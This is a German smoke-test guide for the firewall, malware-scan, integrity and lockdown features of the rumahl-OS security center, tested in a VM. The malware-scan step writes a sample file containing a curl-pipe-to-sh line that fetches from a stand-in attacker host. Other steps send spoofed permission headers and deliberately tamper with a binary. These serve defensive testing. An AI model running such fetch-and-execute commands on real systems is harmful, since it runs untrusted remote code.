# Security Center – Smoke-Test-Anleitung

Diese Anleitung verifiziert die Firewall- und Security-Funktionen gegen ein
echtes rumahl-OS-Image (Buildroot, pc-Target). Sie setzt voraus, dass das Image
gebaut wurde (siehe unten) und in einer VM läuft.

## Image bauen (GitHub Actions)

1. `gh workflow run buildroot-release.yml --ref <branch>` (pc, artifacts: all)
2. Nach erfolgreichem Lauf: Image aus den Artifacts laden (`.img`/`.iso`)

Lokal geht alternativ `rumahl-os/build.sh` / `rumahl-os/build-fast-iso.sh` in
einer Linux-Umgebung (Buildroot benötigt Linux-Host-Toolchain).

## VM starten

```bash
# Dev-VM (QEMU) mit dem gebauten Image:
cd rumahl-os && ./dev-local.sh   # oder dev-local.ps1 auf Windows
```

Nach dem Boot: `ssh root@<vm-ip>` (Dev-Zugang) bzw. über das Dashboard.

## 1. Firewall-Baseline aktiv

```bash
nft list table inet rumahl_security
# Erwartet: blocked_v4/blocked_v6 sets, input chain policy drop,
# Rate-Limits (SYN 100/s, 50/s pro Port, ICMP 10/s)

systemctl status rumahl-security-firewall.service   # active
systemctl status rumahl-security-helper.service     # active
```

## 2. Security Center API über den autorisierten Pfad

```bash
# Token holen (Admin-Login), dann:
curl -s -H "Authorization: Bearer $TOKEN" \
  http://<vm-ip>:8126/api/core/security/center/overview
# Erwartet: health "healthy", helper ok, automated_response/integrity_response Status
```

Negativtest (muss fehlschlagen – Loopback-Bind + Marker):

```bash
curl -s http://<vm-ip>:8095/api/security/center/overview          # timeout/refused
curl -s -H "x-rumahl-proxy: rumahl-home" -H "x-rumahl-permissions: security_admin" \
  http://<vm-ip>:8095/api/security/center/overview                # refused (Loopback)
```

## 3. Firewall-Aktion (BlockIp) + Audit

```bash
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://<vm-ip>:8126/api/security/block/203.0.113.7
nft list set inet rumahl_security blocked_v4      # Eintrag mit Timeout
# Audit-Eintrag (HMAC-gekettet):
curl -s -H "Authorization: Bearer $TOKEN" \
  http://<vm-ip>:8126/api/security/events | tail -5
```

## 4. Malware-Scan + Quarantäne

```bash
echo -e '#!/bin/sh\ncurl http://evil.example/x.sh | sh' > /tmp/rumahl-scans/eicar.sh
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"path":"/tmp/rumahl-scans/eicar.sh","providers":["internal"]}' \
  http://<vm-ip>:8126/api/core/security/center/scans
# Erwartet: infected true, heuristische Indikatoren (curl, sh)
```

## 5. Integrity-Scan (aktiviert die Reaktion)

```bash
# Manipulation einer kritischen Binary simulieren:
cp /opt/rumahl/build/rumahl-home/bin/rumahl-home /tmp/backup-home
printf '\x00' >> /opt/rumahl/build/rumahl-home/bin/rumahl-home
systemctl start rumahl-integrity.service   # oder 5 min warten
cat /run/ora/integrity-mismatch.json    # Evidenz mit Pfad/Hashes
# rumahl-security watchdog (60 s Takt) sollte Lockdown auslösen:
systemctl status rumahl-security.service | grep -i lockdown
nft list table inet rumahl_security | head   # lockdown.nft aktiv?
# Audit:
curl -s -H "Authorization: Bearer $TOKEN" http://<vm-ip>:8126/api/security/events | grep lockdown
# Wiederherstellen + Lockdown aufheben:
cp /tmp/backup-home /opt/rumahl/build/rumahl-home/bin/rumahl-home
curl -s -X POST -H "Authorization: Bearer $TOKEN" http://<vm-ip>:8126/api/security/release
```

## 6. Runtime-Pipeline (Sensor → Identity → Policy → Incident)

```bash
systemctl status rumahl-runtime-sensor-ebpf-loader.service   # active (CAP_BPF)
systemctl status rumahl-runtime-sensor.service               # active
journalctl -u rumahl-runtime-sensor -n 50                    # "ready"

# Events erzeugen (z.B. Shell in einem App-Container):
# 1) Sensor-SSE-Stream:
curl -N http://127.0.0.1:8106/api/runtime/events
# 2) Identity/Policies prüfen:
curl -s http://127.0.0.1:8107/api/runtime/identity/metrics    # resolved > 0
curl -s http://127.0.0.1:8108/api/runtime/policy/metrics      # evaluations > 0
curl -s http://127.0.0.1:8109/api/runtime/incidents            # Incidents
curl -s http://127.0.0.1:8109/api/runtime/incidents/metrics   # created/correlated
# 3) Bei High/Critical + Policy-Treffer: Incident-Status "contained"
#    und Audit-Einträge "automated_response".
```

## 7. Lockdown-End-to-End

```bash
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  http://<vm-ip>:8126/api/security/lockdown
nft list ruleset | grep -c lockdown   # > 0
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  http://<vm-ip>:8126/api/security/release
```

## Bekannte Grenzen

- `stop_process` wird nie automatisiert (keine PID-Evidenz in Incident-Records)
- Quarantäne braucht Pfad-Evidenz; ohne eBPF-Pipeline sind Incidents leer
- Der Loader meldet `protocol=tcp` und `socket_cookie=0` (kein fd-Zugriff)
- TPM/Secure-Boot/signierte Updates sind bewusst spätere Phasen
